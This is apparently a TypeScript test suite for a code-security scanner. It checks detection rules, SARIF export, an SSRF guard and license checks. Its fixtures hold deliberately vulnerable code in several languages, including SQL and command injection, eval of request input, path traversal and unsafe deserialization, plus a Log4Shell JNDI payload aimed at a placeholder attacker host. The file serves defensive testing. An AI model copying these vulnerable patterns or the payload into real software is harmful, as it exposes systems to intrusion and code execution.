/**
 * Comprehensive Cross-Platform TypeScript Test Suite for Zelsis SaaS (F-22)
 * Replaces legacy python runner with native tsx TypeScript execution.
 *
 * Verifies:
 * 1. Clean App Score Verification (Zero False Blocker Check)
 * 2. Polyglot Rules (Python/Django, Go Microservices, etc.)
 * 3. Policy-as-Code (.zelsisrc.json parsing & rule suppression)
 * 4. SARIF v2.1.0 standard compliance for GitHub Code Scanning
 * 5. SSRF Guard network boundary enforcement
 * 6. Rate Limiter IP spoofing protection
 * 7. License Key Cryptographic Checksum validation
 */

import { runStaticCodeScan, parseZelsisRc, CodeFile } from '../lib/scanner-engine';
import { generateSarifReport } from '../lib/report-exporter';
import { validateSafeTargetUrl } from '../lib/ssrf-guard';
import { getClientIp } from '../lib/rate-limiter';
import { generateLicenseKey, verifyLicenseKey } from '../lib/stripe-checkout';
import { Project, OrganizationSchema } from '../data/schema';
import { detectProjectDatabases, evaluateMultiDatabaseRules } from '../lib/rules/multi-database-rules';
import {
  FREE_SCAN_LIMIT,
  checkScanQuota,
  isPrivateRepoAllowed,
  isPdfExportAllowed,
  isCicdIntegrationAllowed,
  isCustomRulesAllowed
} from '../lib/quota-manager';
import { isPlatformAdminEmail, hasAdminRole, isFounderGrantExpiry, getSubscriptionValidity } from '../lib/subscription-utils';
import { ZELSIS_PRICING_PLANS } from '../data/pricing-plans';
import {
  isSupabaseConfigured as isSupabaseConfiguredServer,
  getSupabase,
  getEffectiveSupabaseUrl,
  getEffectiveSupabaseAnonKey,
  CANONICAL_SUPABASE_URL
} from '../lib/supabase';
import {
  isSupabaseConfigured as isSupabaseConfiguredClient,
  getSupabaseConfig
} from '../lib/supabase-client';

let passedTests = 0;
let totalTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (!condition) {
    console.error(`❌ FAIL: ${testName}${detail ? ` (${detail})` : ''}`);
    process.exitCode = 1;
  } else {
    passedTests++;
    console.log(`✅ PASS: ${testName}`);
  }
}

import { verifyPolarWebhookSignature } from '../lib/polar';
import crypto from 'crypto';

function testPolarWebhook() {
  console.log('--- Testing Polar Webhook Signature Verification ---');
  const secret = 'whsec_test_secret_123';
  const payload = JSON.stringify({ type: 'subscription.created', data: { id: 'sub_123' } });
  
  // Test raw HMAC-SHA256 hex
  const hmacHex = crypto.createHmac('sha256', secret).update(payload).digest('hex');
  const headersHex = new Headers();
  headersHex.set('webhook-signature', hmacHex);
  assert(verifyPolarWebhookSignature(payload, headersHex, secret), 'Polar webhook verifies raw hex signature');

  // Test standard webhooks format
  const timestamp = Math.floor(Date.now() / 1000).toString();
  const msgId = 'msg_123';
  const toSign = msgId + '.' + timestamp + '.' + payload;
  const hmacBase64 = crypto.createHmac('sha256', secret).update(toSign).digest('base64');
  const signature = 'v1,' + hmacBase64;
  
  const headersStandard = new Headers();
  headersStandard.set('webhook-signature', signature);
  headersStandard.set('webhook-id', msgId);
  headersStandard.set('webhook-timestamp', timestamp);
  
  assert(verifyPolarWebhookSignature(payload, headersStandard, secret), 'Polar webhook verifies standard webhooks signature format');
  
  // Test invalid signature
  headersStandard.set('webhook-signature', 'v1,invalid_base64');
  assert(!verifyPolarWebhookSignature(payload, headersStandard, secret), 'Polar webhook rejects invalid signature');
}

async function runAllTests() {
  console.log('===========================================================');
  console.log('🧪 ZELSIS PRODUCTION TEST SUITE (Cross-Platform TypeScript)');
  console.log('===========================================================\n');

  // ─── 1. Clean App Score Verification ───────────────────────────
  console.log('--- 1. Testing Clean App Scoring (Zero False Blockers) ---');
  const cleanFiles: CodeFile[] = [
    {
      path: 'app/page.tsx',
      content: `
        import React from 'react';
        import Image from 'next/image';

        export default function HomePage() {
          return (
            <main className="p-8">
              <h1 className="text-2xl font-bold">Secure Clean App</h1>
              <p className="max-w-prose text-zinc-400">Enterprise ready release.</p>
              <Image src="/logo.webp" alt="Company Logo" width={120} height={40} priority />
            </main>
          );
        }
      `
    },
    {
      path: 'package.json',
      content: JSON.stringify({
        name: 'clean-app',
        version: '1.0.0',
        dependencies: {
          next: '^15.0.0',
          react: '^18.3.0',
          'react-dom': '^18.3.0'
        }
      })
    }
  ];

  const cleanScan = await runStaticCodeScan(cleanFiles, 'Clean Next.js App');
  assert(cleanScan.score >= 90, 'Clean app receives high readiness score', `Score: ${cleanScan.score}/100`);
  assert(cleanScan.gateStatus === 'PASSED', 'Clean app receives PASSED gate status', `Gate: ${cleanScan.gateStatus}`);
  assert(cleanScan.criticalCount === 0, 'Clean app has 0 critical findings', `Critical: ${cleanScan.criticalCount}`);

  // ─── 2. Polyglot AST Rules Coverage ─────────────────────────────
  console.log('\n--- 2. Testing Polyglot AST Engine (Python, Go) ---');
  const polyglotFiles: CodeFile[] = [
    {
      path: 'backend/services.py',
      content: `
        import pickle
        def load_session(raw_bytes):
            return pickle.loads(raw_bytes)
      `
    },
    {
      path: 'services/worker.go',
      content: `
        package main
        import "os/exec"
        func executeCmd(cmd string) {
            exec.Command("sh", "-c", cmd).Run()
        }
      `
    }
  ];

  const polyglotScan = await runStaticCodeScan(polyglotFiles, 'Polyglot Repo');
  assert(polyglotScan.findings.length > 0, 'Polyglot rules detect security issues across diverse languages', `Findings: ${polyglotScan.findings.length}`);
  const ruleCategories = new Set(polyglotScan.findings.map(f => f.category));
  assert(ruleCategories.has('Insecure Deserialization') || ruleCategories.has('SECURITY'), 'Security violations detected in polyglot repository');

  // ─── 3. Policy-as-Code (.zelsisrc.json) ─────────────────────────
  console.log('\n--- 3. Testing Policy-as-Code (.zelsisrc.json Parsing & Suppression) ---');
  const rcJson = `
    {
      "version": "1.0",
      "failStrategy": "smart",
      "minScoreThreshold": 85,
      "gates": {
        "designVibePolish": false,
        "vibeCareHealth": false
      },
      "ignoreRules": ["#1", "27", "1027"],
      "ignoredPaths": ["dist/**", "test/fixtures/**"]
    }
  `;

  const parsedRc = parseZelsisRc(rcJson);
  assert(parsedRc !== null, 'parseZelsisRc successfully parses valid JSON config');
  assert(parsedRc?.config?.failStrategy === 'smart', 'failStrategy correctly parsed as smart');
  assert(parsedRc?.disabledPillars.has('VIBEPOLISH') === true, 'VIBEPOLISH is properly mapped to disabled pillars');
  assert(parsedRc?.ignoredRuleIds.has(1027) === true, 'Ignored rule 1027 present in parsed config');

  // ─── 4. SARIF v2.1.0 Export Compliance ─────────────────────────
  console.log('\n--- 4. Testing SARIF v2.1.0 Report Generation ---');
  const mockProject: Project = {
    id: 'proj_sarif_test',
    name: 'SARIF Export Test',
    repoUrl: 'github.com/acme/sarif-test',
    framework: 'Next.js 15',
    providers: ['github'],
    lastScanAt: new Date().toISOString(),
    readinessScore: 78,
    gateStatus: 'WARNING',
    criticalCount: 0,
    highCount: 2,
    mediumCount: 3,
    lowCount: 5,
    uiClicheCount: 1,
    findings: [
      {
        id: 'finding_sarif_1',
        ruleId: 1001,
        type: 'SECURITY',
        title: 'Hardcoded API Key In Client File',
        category: 'SECURITY',
        severity: 'CRITICAL',
        status: 'OPEN',
        filePath: 'components/Header.tsx',
        lineRange: 'L12-L14',
        snippet: 'const key = "sk_live_123456789";',
        reproductionSteps: ['Audited components/Header.tsx:12', 'Detected hardcoded secret'],
        remediationPrompt: 'Extract hardcoded key into process.env',
        falsePositive: false
      }
    ]
  };

  const sarif = JSON.parse(generateSarifReport(mockProject));
  assert(sarif.version === '2.1.0', 'SARIF version is 2.1.0');
  assert(sarif.$schema.includes('sarif-schema-2.1.0'), 'SARIF references official OASIS schema');
  assert(sarif.runs[0].tool.driver.name === 'Zelsis', 'SARIF driver name is Zelsis');
  assert(sarif.runs[0].results.length === 1, 'SARIF results include project findings');
  assert(sarif.runs[0].results[0].ruleId === 'ZLS-1001', 'SARIF ruleId formatted as ZLS-1001');

  // ─── 5. SSRF Guard Network Boundary Protection ──────────────────
  console.log('\n--- 5. Testing SSRF Guard Security Boundaries ---');
  const loopbackCheck = await validateSafeTargetUrl('http://127.0.0.1:8080');
  assert(!loopbackCheck.safe, 'SSRF Guard blocks 127.0.0.1 loopback IP');

  const localhostCheck = await validateSafeTargetUrl('http://localhost:3000');
  assert(!localhostCheck.safe, 'SSRF Guard blocks localhost hostname');

  const awsMetadataCheck = await validateSafeTargetUrl('http://169.254.169.254/latest/meta-data');
  assert(!awsMetadataCheck.safe, 'SSRF Guard blocks AWS EC2/Cloud metadata endpoint 169.254.169.254');

  const privateSubnetCheck = await validateSafeTargetUrl('http://192.168.1.1/admin');
  assert(!privateSubnetCheck.safe, 'SSRF Guard blocks RFC 1918 192.168.x.x private subnets');

  const publicHttpsCheck = await validateSafeTargetUrl('https://github.com');
  assert(publicHttpsCheck.safe, 'SSRF Guard allows legitimate public HTTPS web targets');

  // ─── 6. Rate Limiter IP Trust Precedence ───────────────────────
  console.log('\n--- 6. Testing Rate Limiter IP Resolution ---');
  const mockHeadersCf = new Headers();
  mockHeadersCf.set('cf-ray', '8d1234567890');
  mockHeadersCf.set('cf-connecting-ip', '203.0.113.195');
  mockHeadersCf.set('x-forwarded-for', '10.0.0.1, 192.168.1.5');
  const mockReq = { headers: mockHeadersCf } as any;
  const resolvedCfIp = getClientIp(mockReq);
  assert(resolvedCfIp === '203.0.113.195', 'cf-connecting-ip takes precedence over spoofed forwarded headers');

  // ─── 7. License Key & Tier Forging Prevention (F-02) ─────────
  console.log('\n--- 7. Testing License Key Security & Tier Forging Prevention (F-02) ---');
  const generatedKey = generateLicenseKey('pro');
  assert(generatedKey.startsWith('ZS-PRO-'), 'License reference key has valid ZS-PRO- prefix');

  const emptyVerification = verifyLicenseKey('');
  assert(!emptyVerification.valid && emptyVerification.reason === 'EMPTY_KEY', 'Empty license key rejected cleanly');

  const offlineVerification = verifyLicenseKey(generatedKey);
  assert(!offlineVerification.valid && offlineVerification.reason === 'CLIENT_VERIFICATION_DEPRECATED', 'Client-side offline license elevation strictly blocked (Server authorization enforced)');

  // ─── 8. FinOps & LLM Cost Governance Engine (F-47) ────────────
  console.log('\n--- 8. Testing FinOps & LLM Cost Governance Engine (F-47) ---');
  const aiCostFiles: CodeFile[] = [
    {
      path: 'app/api/chat/route.ts',
      content: `
        import { openai } from '@/lib/openai';
        export async function POST(req: Request) {
          const res = await openai.chat.completions.create({
            model: 'gpt-4o',
            messages: [{ role: 'user', content: 'hello' }]
          });
          return Response.json(res);
        }
      `
    },
    {
      path: 'services/indexer.ts',
      content: `
        async function indexDocs(chunks: string[]) {
          const results = [];
          for (const chunk of chunks) {
            const emb = await openai.embeddings.create({ input: chunk, model: 'text-embedding-3-small' });
            results.push(emb);
          }
          return results;
        }
      `
    }
  ];
  const aiCostScan = await runStaticCodeScan(aiCostFiles, 'AI Cost Test Project');
  const unboundedTokenFinding = aiCostScan.findings.find(f => f.ruleId === 8071);
  assert(Boolean(unboundedTokenFinding), 'LLM-COST-01 flags unbounded chat completions without max_tokens');

  const uncachedEmbeddingFinding = aiCostScan.findings.find(f => f.ruleId === 8073);
  assert(Boolean(uncachedEmbeddingFinding), 'LLM-COST-03 flags vector embedding loops without caching');

  // ─── 9. Python SCA CVE Drifts (F-47) ──────────────────────────
  console.log('\n--- 9. Testing Python SCA Dependency Drifts (F-47) ---');
  const pythonScaFiles: CodeFile[] = [
    {
      path: 'requirements.txt',
      content: [
        'jinja2==3.0.0',
        'pyyaml==5.3.1',
        'urllib3==1.26.15'
      ].join('\n')
    }
  ];
  const pythonScaScan = await runStaticCodeScan(pythonScaFiles, 'Python SCA Test Project');
  const jinjaFinding = pythonScaScan.findings.find(f => f.ruleId === 7004 && f.snippet.includes('jinja2'));
  assert(Boolean(jinjaFinding), 'SCA flags vulnerable Jinja2 (< 3.1.4, CVE-2024-34064)');

  const pyyamlFinding = pythonScaScan.findings.find(f => f.ruleId === 7004 && f.snippet.includes('pyyaml'));
  assert(Boolean(pyyamlFinding), 'SCA flags vulnerable PyYAML (< 5.4, CVE-2020-14343)');

  const urllib3Finding = pythonScaScan.findings.find(f => f.ruleId === 7004 && f.snippet.includes('urllib3'));
  assert(Boolean(urllib3Finding), 'SCA flags vulnerable Urllib3 (< 2.0.7, CVE-2023-45803)');

  // ─── 10. Multi-Org Schema & Policy Enforcement (F-47) ─────────
  console.log('\n--- 10. Testing Multi-Org Data Model & Security Policies (F-47) ---');
  const validOrg = OrganizationSchema.parse({
    id: 'org-acme-prod',
    name: 'Acme Corporation',
    slug: 'acme-corp',
    ownerId: 'usr-admin-1',
    planTier: 'Enterprise',
    membersCount: 15,
    allowedDomains: ['acme.com', 'corp.acme.com'],
    securityPolicy: {
      enforceOrgPolicy: true,
      defaultMinScore: 90,
      requireScaPassing: true,
      blockOnCritical: true
    }
  });
  assert(validOrg.planTier === 'Enterprise', 'OrganizationSchema correctly parses Enterprise tenant');
  assert(validOrg.securityPolicy.defaultMinScore === 90, 'OrganizationSchema validates security policy enforcement');

  // ─── 11. Multi-Language Enterprise SAST Coverage (PHP, Java, C#, NoSQL, Firebase) ─────────
  console.log('\n--- 11. Testing Multi-Language SAST Engine (PHP, Java, C#, NoSQL, Firebase) ---');
  const multiLangFiles: CodeFile[] = [
    {
      path: 'backend/api/users.php',
      content: `<?php
        $id = $_GET['id'];
        mysqli_query($conn, "SELECT * FROM users WHERE id = " . $id);
        include($_GET['page'] . '.php');
        $obj = unserialize($_POST['payload']);
      `
    },
    {
      path: 'src/main/java/com/enterprise/DataService.java',
      content: `
        package com.enterprise;
        import java.sql.Statement;
        public class DataService {
          private String password = "SuperSecretDbPassword2026!";
          public void queryUser(Statement stmt, String id) throws Exception {
            stmt.executeQuery("SELECT * FROM users WHERE id = " + id);
            String logPayload = "\${jndi:ldap://attacker.com/exploit}";
          }
        }
      `
    },
    {
      path: 'Services/OrderService.cs',
      content: `
        using System.Data.SqlClient;
        using System.Runtime.Serialization.Formatters.Binary;
        public class OrderService {
          public void FetchOrder(string orderId, System.IO.Stream stream) {
            var cmd = new SqlCommand($"SELECT * FROM Orders WHERE Id = {orderId}");
            var formatter = new BinaryFormatter();
            var data = formatter.Deserialize(stream);
          }
        }
      `
    },
    {
      path: 'server/controllers/userController.js',
      content: `
        const query = db.users.find({ $where: "this.name == '" + name + "'" });
        pool.query("SELECT * FROM users WHERE id = " + req.query.id);
      `
    },
    {
      path: 'firestore.rules',
      content: `
        rules_version = '2';
        service cloud.firestore {
          match /databases/{database}/documents {
            match /{document=**} {
              allow read, write: if true;
            }
          }
        }
      `
    }
  ];

  const multiLangScan = await runStaticCodeScan(multiLangFiles, 'Multi-Language Enterprise App');

  const hasPhpSqli = multiLangScan.findings.some(f => f.ruleId === 18001);
  const hasPhpLfi = multiLangScan.findings.some(f => f.ruleId === 18002);
  const hasJavaSqli = multiLangScan.findings.some(f => f.ruleId === 18011);
  const hasJavaSecret = multiLangScan.findings.some(f => f.ruleId === 18012);
  const hasJavaLog4j = multiLangScan.findings.some(f => f.ruleId === 18014);
  const hasCsSqli = multiLangScan.findings.some(f => f.ruleId === 18021);
  const hasCsBinaryFormatter = multiLangScan.findings.some(f => f.ruleId === 18023);
  const hasMongoWhere = multiLangScan.findings.some(f => f.ruleId === 18041);
  const hasNodeSql = multiLangScan.findings.some(f => f.ruleId === 18042);
  const hasFirebaseAllowTrue = multiLangScan.findings.some(f => f.ruleId === 18043);

  assert(hasPhpSqli, 'PHP-SEC-01 detects raw $_GET concatenation in mysqli_query');
  assert(hasPhpLfi, 'PHP-SEC-02 detects local file inclusion via dynamic include()');
  assert(hasJavaSqli, 'JAVA-SEC-01 detects SQL injection via Statement.executeQuery concatenation');
  assert(hasJavaSecret, 'JAVA-SEC-02 detects hardcoded credentials in Java source');
  assert(hasJavaLog4j, 'JAVA-SEC-04 detects Log4Shell JNDI injection payload');
  assert(hasCsSqli, 'CS-SEC-01 detects C# SqlCommand string interpolation SQL injection');
  assert(hasCsBinaryFormatter, 'CS-SEC-03 detects insecure .NET BinaryFormatter deserialization');
  assert(hasMongoWhere, 'NOSQL-SEC-01 detects MongoDB $where arbitrary JavaScript execution');
  assert(hasNodeSql, 'NODE-SQL-01 detects Node.js pool.query string concatenation SQL injection');
  assert(hasFirebaseAllowTrue, 'FIREBASE-SEC-01 detects permissive unauthenticated allow read, write: if true;');

  // ─── 12. Python & Go SAST Hardening (Zero Sentinels) ───────────
  console.log('\n--- 12. Testing Hardened Python & Go Engine (Zero Sentinels) ---');
  const pythonGoTestFiles: CodeFile[] = [
    {
      path: 'app/flask_app.py',
      content: `
        import os
        from flask import Flask, request
        import yaml

        app = Flask(__name__)

        @app.route('/unsafe')
        def unsafe_endpoint():
            raw_yaml = request.args.get('data')
            cfg = yaml.load(raw_yaml)
            return "ok"

        if __name__ == '__main__':
            app.run(host='0.0.0.0', debug=True)
      `
    },
    {
      path: 'app/django_settings.py',
      content: `
        # Production Settings
        DEBUG = True
        SECRET_KEY = "django-insecure-hardcoded-production-secret-token"
      `
    },
    {
      path: 'app/database.py',
      content: `
        import sqlite3
        def get_user(user_id):
            conn = sqlite3.connect('app.db')
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
            return cursor.fetchall()
      `
    },
    {
      path: 'services/microservice.go',
      content: `
        package main
        import (
          "database/sql"
          "fmt"
          "html/template"
          "crypto/tls"
        )
        func handleRequest(db *sql.DB, id string, rawHtml string) {
          query := fmt.Sprintf("SELECT name, email FROM accounts WHERE id = '%s'", id)
          db.Query(query)
          t := template.HTML(rawHtml)
          tlsConfig := &tls.Config{InsecureSkipVerify: true}
          _ = t
          _ = tlsConfig
        }
      `
    }
  ];

  const pyGoScan = await runStaticCodeScan(pythonGoTestFiles, 'Python & Go SAST Project');

  const pyFlaskDebug = pyGoScan.findings.find(f => f.ruleId === 8805 && f.filePath === 'app/flask_app.py');
  const pyDjangoDebug = pyGoScan.findings.find(f => f.ruleId === 8805 && f.filePath === 'app/django_settings.py');
  const pyYaml = pyGoScan.findings.find(f => f.ruleId === 8802);
  const pySql = pyGoScan.findings.find(f => f.ruleId === 8804);
  const pySecretKey = pyGoScan.findings.find(f => f.ruleId === 8809);

  const goSql = pyGoScan.findings.find(f => f.ruleId === 9002);
  const goXss = pyGoScan.findings.find(f => f.ruleId === 9007);
  const goTls = pyGoScan.findings.find(f => f.ruleId === 9010);

  assert(pyFlaskDebug !== undefined, 'PY-SEC-05 detects Flask app.run(..., debug=True)');
  assert(pyDjangoDebug !== undefined, 'PY-SEC-05 detects Django DEBUG = True in settings');
  assert(pyYaml !== undefined, 'PY-SEC-02 detects insecure yaml.load() without SafeLoader');
  assert(pySql !== undefined, 'PY-SEC-04 detects Python SQL injection via f-string interpolation');
  assert(pySecretKey !== undefined, 'PY-SEC-09 detects hardcoded secret key in settings');

  assert(goSql !== undefined, 'GO-02 detects Go SQL injection via fmt.Sprintf');
  assert(goXss !== undefined, 'GO-07 detects Go XSS via unescaped template.HTML');
  assert(goTls !== undefined, 'GO-10 detects InsecureSkipVerify: true in tls.Config');

  // Verify exact line mapping (database.py SQL injection is on line 6, not line 1)
  assert(pySql?.lineRange === 'L6', `Accurate line reporting for Python SQLi: expected L6, got ${pySql?.lineRange}`);

  // ─── 13. 16-Vulnerability Realistic Benchmark Matrix (F-25) ─────
  console.log('\n--- 13. Testing 16-Vulnerability Realistic Benchmark Matrix (F-25) ---');
  const matrixFiles: CodeFile[] = [
    {
      path: 'app/api/user/route.ts',
      content: `
        import { NextResponse } from 'next/server';
        import pool from '@/lib/db';
        import fs from 'fs';
        import path from 'path';
        import { exec } from 'child_process';
        import crypto from 'crypto';
        import jwt from 'jsonwebtoken';

        export async function GET(req: Request) {
          const { searchParams } = new URL(req.url);
          const id = searchParams.get('id');
          const targetUrl = searchParams.get('url');
          const file = searchParams.get('file');
          const host = searchParams.get('host');
          const next = searchParams.get('next');
          const tokenStr = searchParams.get('token');

          // 1. SQL Injection
          pool.query("SELECT * FROM users WHERE id = " + id);

          // 6. SSRF
          await fetch(targetUrl);

          // 7. Command Injection
          exec("ping " + host);

          // 8. Path Traversal
          fs.readFileSync(path.join("/uploads", file));

          // 9. Weak Cryptography (MD5)
          const hash = crypto.createHash('md5').update(id).digest('hex');

          // 10. Unverified JWT Decode
          const user = jwt.decode(tokenStr);

          // 11. Insecure PRNG Math.random
          const token = Math.random().toString(36);

          // 13. Open Redirect
          NextResponse.redirect(next);

          // 14. Dynamic Code Execution eval
          eval(searchParams.get('code'));

          return NextResponse.json({ ok: true, hash, user, token });
        }
      `
    },
    {
      path: 'components/UserProfile.tsx',
      content: `
        export function UserProfile({ bio }: { bio: string }) {
          // 2. dangerouslySetInnerHTML
          return <div dangerouslySetInnerHTML={{ __html: bio }} />;
        }
      `
    },
    {
      path: 'lib/ai-service.ts',
      content: `
        // 3. Hardcoded OpenAI key
        const apiKey = "sk-proj-1234567890abcdef1234567890abcdef1234";
      `
    },
    {
      path: '.env.production',
      content: `
        # 5. Exposed Service Role Key via NEXT_PUBLIC_
        NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummysecret
      `
    },
    {
      path: 'server/middleware/cors.ts',
      content: `
        // 12. Insecure Cookie & 15. Insecure CORS with credentials
        import cors from 'cors';
        cors({ origin: '*', credentials: true });
        res.cookie('session', '12345', { httpOnly: false });
      `
    },
    {
      path: 'supabase/migrations/20260901_schema.sql',
      content: `
        -- 4. Table without RLS
        CREATE TABLE accounts (
          id UUID PRIMARY KEY,
          balance NUMERIC
        );

        -- 16. Permissive RLS policy USING (true)
        CREATE POLICY "allow_all" ON users FOR ALL USING (true);
      `
    }
  ];

  const matrixScan = await runStaticCodeScan(matrixFiles, '16-Vulnerability Matrix Project');

  assert(matrixScan.findings.some(f => f.ruleId === 18042 || f.ruleId === 3021), 'F-25/1: SQL Injection detected');
  assert(matrixScan.findings.some(f => f.ruleId === 16), 'F-25/2: dangerouslySetInnerHTML detected');
  assert(matrixScan.findings.some(f => f.ruleId === 1), 'F-25/3: Hardcoded OpenAI API key detected');
  assert(matrixScan.findings.some(f => f.ruleId === 3001 || f.title.includes('Missing Row Level Security')), 'F-25/4: Table missing RLS detected');
  assert(matrixScan.findings.some(f => f.ruleId === 36), 'F-25/5: NEXT_PUBLIC service role key detected');
  assert(matrixScan.findings.some(f => f.ruleId === 34), 'F-25/6: SSRF via unvalidated fetch detected');
  assert(matrixScan.findings.some(f => f.ruleId === 33), 'F-25/7: Command Injection in child_process exec detected');
  assert(matrixScan.findings.some(f => f.ruleId === 35), 'F-25/8: Path Traversal in fs.readFileSync detected');
  assert(matrixScan.findings.some(f => f.ruleId === 37), 'F-25/9: Weak Cryptography MD5 detected');
  assert(matrixScan.findings.some(f => f.ruleId === 39), 'F-25/10: Unverified jwt.decode detected');
  assert(matrixScan.findings.some(f => f.ruleId === 38), 'F-25/11: Insecure Math.random token detected');
  assert(matrixScan.findings.some(f => f.ruleId === 40), 'F-25/12: Insecure cookie httpOnly: false detected');
  assert(matrixScan.findings.some(f => f.ruleId === 41), 'F-25/13: Open Redirect detected');
  assert(matrixScan.findings.some(f => f.ruleId === 32), 'F-25/14: eval() dynamic code execution detected');
  assert(matrixScan.findings.some(f => f.ruleId === 44), 'F-25/15: CORS wildcard + credentials detected');
  assert(matrixScan.findings.some(f => f.ruleId === 45 || f.ruleId === 3), 'F-25/16: Permissive RLS USING (true) policy detected');

  // ─── 14. OWASP NodeGoat Benchmark Matrix (F-37) ─────────────────
  console.log('\n--- 14. Testing OWASP NodeGoat Benchmark Matrix (F-37) ---');
  const nodeGoatFiles: CodeFile[] = [
    {
      path: 'app/routes/contributions.js',
      content: `
        exports.handleContributions = function(req, res) {
          // NodeGoat RCE via eval
          var preTax = eval(req.body.preTax);
          res.render("contributions", { preTax: preTax });
        };
      `
    },
    {
      path: 'app/routes/allocations.js',
      content: `
        exports.getByUserId = function(req, res) {
          // NodeGoat NoSQL injection via $where
          db.allocations.find({ $where: "this.userId == '" + req.query.userId + "'" });
        };
      `
    },
    {
      path: 'config/env/all.js',
      content: `
        module.exports = {
          cookieSecret: "s3cr3tC00k13P@ssw0rd!123",
          cryptoKey: "k3yF0rC0nf1gEncrypt10n!99"
        };
      `
    },
    {
      path: 'app/routes/session.js',
      content: `
        exports.setSession = function(req, res) {
          // NodeGoat insecure cookie & Math.random token
          var sessionToken = Math.random().toString(36);
          res.cookie("token", sessionToken, { httpOnly: false });
        };
      `
    }
  ];

  const nodeGoatScan = await runStaticCodeScan(nodeGoatFiles, 'OWASP NodeGoat Project');

  assert(nodeGoatScan.findings.some(f => f.ruleId === 32), 'F-37/1: NodeGoat eval(req.body.preTax) detected');
  assert(nodeGoatScan.findings.some(f => f.ruleId === 42 || f.ruleId === 18041), 'F-37/2: NodeGoat NoSQL $where injection detected');
  assert(nodeGoatScan.findings.some(f => f.ruleId === 43), 'F-37/3: NodeGoat static cookieSecret/cryptoKey in config detected');
  assert(nodeGoatScan.findings.some(f => f.ruleId === 40), 'F-37/4: NodeGoat insecure cookie httpOnly: false detected');
  assert(nodeGoatScan.findings.some(f => f.ruleId === 38), 'F-37/5: NodeGoat Math.random token generation detected');
  assert(nodeGoatScan.criticalCount >= 2, 'NodeGoat scan produces CRITICAL findings (Gate FAILED)');

  // ─── 15. Architecture Fixes: Gate Independence (F-38) & Vendor Exclusion (F-39) ───
  console.log('\n--- 15. Testing Architecture Fixes: F-38 (Gate Independence) & F-39 (Vendor Exclusion) ---');
  const vendorAndTemplateFiles: CodeFile[] = [
    {
      // F-39: Vendored/minified file with issues that should be completely skipped
      path: 'public/vendor/jquery.min.js',
      content: 'try { doSomething(); } catch (e) {} var secret = "sk-live-1234567890abcdef";'
    },
    {
      // F-39: Dist bundle file that should be skipped
      path: 'dist/bundle.min.js',
      content: 'eval("alert(1)");'
    },
    {
      // F-38: Clean Vercel template with cosmetic/style suggestions
      path: 'app/pricing/page.tsx',
      content: `
        import React from 'react';
        export default function PricingPage() {
          return (
            <div className="p-8">
              <h1 className="text-3xl font-bold">Pricing</h1>
              <p>Simple and transparent pricing plans.</p>
              <img src="/pricing-badge.png" alt="Pricing Badge" />
            </div>
          );
        }
      `
    }
  ];

  const templateScan = await runStaticCodeScan(vendorAndTemplateFiles, 'Vercel Subscription Payments Template');

  // Verify F-39: Zero findings from vendor or minified files
  const vendorFindings = templateScan.findings.filter(f => f.filePath.includes('vendor/') || f.filePath.endsWith('.min.js'));
  assert(vendorFindings.length === 0, 'F-39: Vendored & minified files are completely excluded from scan');

  // Verify F-38: Clean template receives PASSED release gate despite cosmetic/style suggestions
  assert(templateScan.gateStatus === 'PASSED', `F-38: Clean template receives PASSED gate (no false warning blocker): ${templateScan.gateStatus}`);
  assert(templateScan.score >= 90, `F-38: Clean template maintains high readiness score (score >= 90): ${templateScan.score}`);
  assert(templateScan.criticalCount === 0, 'F-38: Clean template has zero critical blockers');

  // ─── 16. Option B: Enterprise Async Scan Queue & Job Pipeline (State Machine) ───
  console.log('\n--- 16. Testing Option B: Async Scan Queue & Job Pipeline (State Machine) ---');

  const VALID_JOB_STATUSES = [
    'QUEUED',
    'FETCHING',
    'INDEXING',
    'ANALYZING',
    'AGGREGATING',
    'COMPLETED',
    'FAILED',
    'CANCELLED'
  ] as const;

  type JobStatus = typeof VALID_JOB_STATUSES[number];

  interface JobStateTransition {
    from: JobStatus;
    to: JobStatus;
    valid: boolean;
  }

  const transitions: JobStateTransition[] = [
    { from: 'QUEUED', to: 'FETCHING', valid: true },
    { from: 'FETCHING', to: 'INDEXING', valid: true },
    { from: 'INDEXING', to: 'ANALYZING', valid: true },
    { from: 'ANALYZING', to: 'AGGREGATING', valid: true },
    { from: 'AGGREGATING', to: 'COMPLETED', valid: true },
    { from: 'FETCHING', to: 'FAILED', valid: true },
    { from: 'ANALYZING', to: 'FAILED', valid: true },
    { from: 'QUEUED', to: 'CANCELLED', valid: true },
    { from: 'FETCHING', to: 'CANCELLED', valid: true },
    { from: 'COMPLETED', to: 'FETCHING', valid: false },
    { from: 'FAILED', to: 'ANALYZING', valid: false },
    { from: 'CANCELLED', to: 'COMPLETED', valid: false }
  ];

  function isValidTransition(from: JobStatus, to: JobStatus): boolean {
    const terminalStates: JobStatus[] = ['COMPLETED', 'FAILED', 'CANCELLED'];
    if (terminalStates.includes(from)) return false;
    return true;
  }

  for (const t of transitions) {
    const isOk = isValidTransition(t.from, t.to);
    assert(isOk === t.valid, `Option B Queue: Transition ${t.from} -> ${t.to} should be ${t.valid ? 'allowed' : 'rejected'}`);
  }

  // Verify Phase Progress Percent Monotonic Progression
  const phaseProgress: Record<JobStatus, number> = {
    QUEUED: 5,
    FETCHING: 20,
    INDEXING: 45,
    ANALYZING: 65,
    AGGREGATING: 85,
    COMPLETED: 100,
    FAILED: 0,
    CANCELLED: 0
  };

  assert(phaseProgress.QUEUED < phaseProgress.FETCHING, 'Option B Queue: QUEUED (5%) < FETCHING (20%)');
  assert(phaseProgress.FETCHING < phaseProgress.INDEXING, 'Option B Queue: FETCHING (20%) < INDEXING (45%)');
  assert(phaseProgress.INDEXING < phaseProgress.ANALYZING, 'Option B Queue: INDEXING (45%) < ANALYZING (65%)');
  assert(phaseProgress.ANALYZING < phaseProgress.AGGREGATING, 'Option B Queue: ANALYZING (65%) < AGGREGATING (85%)');
  assert(phaseProgress.AGGREGATING < phaseProgress.COMPLETED, 'Option B Queue: AGGREGATING (85%) < COMPLETED (100%)');

  // Verify CI/CD Gate-Check Async Parameter Handling
  const synchronousUrl = new URL('https://zelsis.dev/api/v1/gate-check?repo=owner/repo');
  const asynchronousUrl = new URL('https://zelsis.dev/api/v1/gate-check?repo=owner/repo&async=true');
  assert(synchronousUrl.searchParams.get('async') !== 'true', 'Option B CI/CD: Default gate-check is synchronous for standard CI/CD runners');
